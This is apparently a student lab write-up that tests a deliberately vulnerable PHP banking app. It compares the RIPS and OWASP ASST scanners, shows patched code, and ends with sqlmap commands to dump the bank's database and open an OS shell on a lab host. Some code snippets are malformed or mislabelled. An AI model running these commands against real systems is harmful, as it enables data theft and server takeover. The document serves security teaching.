### Exercise 1: White Box Web Application Vulnerability Testing
__1. Apply your chosen scanner on the unpatched version of the source code of your webapplication. Identify the vulnerabilities which were not found by the tool and briefly explain why the tool was unable to find them (try to condense your answer to particular classes of vulnerabilities)?__

__Solution :__

**Chosen scanners:** 
   - RIPS
   - OWASP ASST

**Installation:**
   - **RIPS:**
      - Extract the files to your local web server's document root (in my case /var/www/html/).
      - To run the tool open the browser at http://localhost/rips-master.
      - Give a location to the code for testing in the *Path/file* field. 
      - Select *Verbosity level*: 4.
      - *Vulnerability type*: can select all or a particular vulnerability and hit scan.
         
      ![RIPS_SCAN](../task3/images/RIPS_SCAN.JPG)
      
   
   - **OWASP ASST:**
      -  Install [Xampp](https://sourceforge.net/projects/xampp/files/XAMPP%20Linux/5.6.40/) the same version used for the project (PHP-5).
      -  Put the project to test in Xampp folder `/opt/lampp/htdocs/vbank`. 
      -  Install Node.js.
      
      ```bash
         sudo apt-get install nodejs -y
         sudo apt-get install npm -y
         sudo npm install n -g
         sudo n 12.13.0
        ```    
      - Put the code of [ASST](https://github.com/OWASP/ASST) in the same folder `/opt/lampp/htdocs/ASST`.
      - Change `DEFAULT_PROJECT_PATH_TO_SCAN` in `config.js` to following.
      
      ```js
         DEFAULT_PROJECT_PATH_TO_SCAN: "/var/www/vbank_code/", // Path to project to test
      ```
     - Change following fields in `config_php_lang.js` to following.   
     
     ```js
      PHP_EXE_BIN_PATH: "/usr/bin/php", 
      IS_DBMS_USED: true,
      DBMS: "mysql",
      // if above IS_DBMS_USED = true, bellow settings are enabled and must be set
      YOUR_WEBAPP_DBMS_SERVER_IP: "127.0.0.1", 
      YOUR_WEBAPP_DBMS_DB_NAME: "vbank",
      YOUR_WEBAPP_DBMS_USERNAME: "root",
      YOUR_WEBAPP_DBMS_PASSWORD: "kakashi",
     ```
     ```bash
      sudo /opt/lampp/lampp start xampp
      cd /opt/lampp/htdocs/ASST
      node main.js
     ```
      ![ASST_SCAN](../task3/images/ASST_SCAN.JPG)

#### Vulnerabilities found (Test from both RIPS and ASST)           
| Vulnerability type          | RIPS | OWASP ASST |
| --------------------------- | ---- | ---------- |
| SQL Injection               | 17   | 21         |
| Cross site scripting        | 95   | 2          |
| Cross-Site Request Forgery  | 0    | 6          |
| Server-side request forgery | 0    | 0          |
| Local file inclusion        | 5    | 0          |
| Broken Authentication       | 0    | 6          |
| Session Hijacking           | 0    | 0          |
| Session Fixation            | 1    | 0          |
| Remote code Injection       | 1    | 0          |
| Sensitive Data Exposure     | 0    | 7          |
| Known Vulnerabilities       | 0    | 2          |


__1.1 Why the tool was unable to find them?__

- Every tool has its own rules and uses different techniques to detect vulnerabilities.
- Tool didn't find vulnerabilities such as Authentication problems, Access Control issues, insecure use of Cryptography.
  - This is due to a lack of compilation instructions, access to remote APIs inability to find the right libraries.
- RIPS didn't find CSRF AND SSRF because it was not included in rules whereas ASST detected CSRF because it has rules defined for CSRF vulnerabilities.
- CSRF and SSRF required manual manipulation of URL which is hard for automated tool to take care of.





__2. Run the analysis again using the patched version of the source code of your web-application.
Check whether the vulnerabilities found before are still reported or not.__

- Red dot indicate there is an user-implemented security patch. 
![RIPS_ICONS](../task3/images/RIPS_ICONS.JPG)

**Test Cases:**
- **SQL Injection**
   - RIPS Scanner detected the SQLi if the code used the `mysql_query` function.<br/>
   ![RIPS_SQLI](../task3/images/RIPS_SQLI.JPG)
   - Variables (passed from other PHP classes or user input) used in `mysql_query` are protected using `mysql_real_escape_string`.<br/>
   ![RIPS_SQLI_FIX](../task3/images/RIPS_SQLI_FIX.JPG) 
- **Code Execution**
   - Vulnarable code
   ```php
  if(isset($http['query']) && $http['query'] != "") {
		$replaceWith =  preg_replace('#\b". str_replace('\\', '\\\\', ". $http['query'] ."\b#i', '<span class=\"queryHighlight\">\\\\0</span>','\\0');
   ``` 
   ![RIPS_CODE_EXE](../task3/images/RIPS_CODE_EXE.JPG)
   <br/>
   - Security patch 

   ```php
   if(isset($http['query']) && $http['query'] != "" && preg_match('/^[a-zA-Z\d]+$/', $http['query'])) {
   ```
   - Despite applying the patch (Applying check to user input) tool still shows the vulnerability because the rule is to not have any user input data in functions this is a false positive.
  
   ![RIPS_CODE_EXE](../task3/images/RIPS_CODE_EXE.JPG)
  
  - 
- **Cross Site Scripting:**
   - Use `htmlspecialchars` to display data.
   - `transfersStr` is a string containing HTML table in it so `htmlspecialchars` cant be used. 
   - We can apply the `htmlspecialchars` to Row data used in transfersStr. This resulted in false positives but it is no longer vulnerable to XSS.

**Test Cases:**
- **SQL Injection**
  - Prepared statement

      if ($stmt = $link->prepare("SELECT id,password,username,name,firstname,time,lasttime,lastip from users where username =? and password=?")) {   
         $stmt->bind_param("ss", $username,$password);
         $stmt -> execute();
         $stmt -> store_result();
         $stmt -> bind_result($id,$password,$username,$name,$firstname,$time,$lasttime,$lastip);

      $password = $_REQUEST['password'];
   ```
   - Security patch
   ```$username = htmlentities(htmlspecialchars($_REQUEST['username']);
      $password = htmlentities(htmlspecialchars($_REQUEST['password']);
   ```

![ASST_XSS](../task3/images/ASST_XSS.JPG)
![ASST_XSS_FIX](../task3/images/ASST_XSS_FIX.JPG)
- **Cross-Site Request Forgery**
- Security patch
   ```html
    <input type="hidden" name="csrf_token" value="csrftoken" />
   ```
   - Use the same token value on the server side to validate.
   - Additionally implement Same origin policy or send csrf token in as part of headers.

![ASST_CSRF](../task3/images/ASST_CSRF.png)
![ASST_CSRF_FIX](../task3/images/ASST_CSRF_FIX.png)


- Even after fixing the code with a security patch, there are a lot of false positives because the tool is not sure of the integrity and security of data flow from input to output.







### Exercise 2: Black-Box Web Application Vulnerability Testing


__1. Download two web vulnerability scanners and describe the all needed set-up environment
settings__
__solution :__
1. Owasp Zed Attack Proxy (Linux) (Avaialble in `kali Linux`)

__3. Now you have collected enough information about the victim web application and found
multiple serious SQL injection vulnerabilities.
Use an automatic exploitation tool (e.g. sqlmap) to dump all the database, upload a web shell
and prove that you have control of the bank server!__

- Using `sqlmap` to find sql injection and dump database content
- Usage
```bash
$: sqlmap -u 'http://192.168.37.128/login.php?username=alex' --dbs
```
__Result:__


![sqlmap_dbs](../task3/images/sqlmap_dbs.PNG)

- Found `vbank` database (along with others)
- use `--dump` as switch and dump the contents of database `vbank` with `-D` switch


```bash
└─$ sqlmap -u 'http://192.168.37.128/login.php?username=alex' -D vbank --dump            
```




- Uploading a shell


```bash
$ sqlmap -u 'http://192.168.37.128/login.php?username=alex' --os-shell
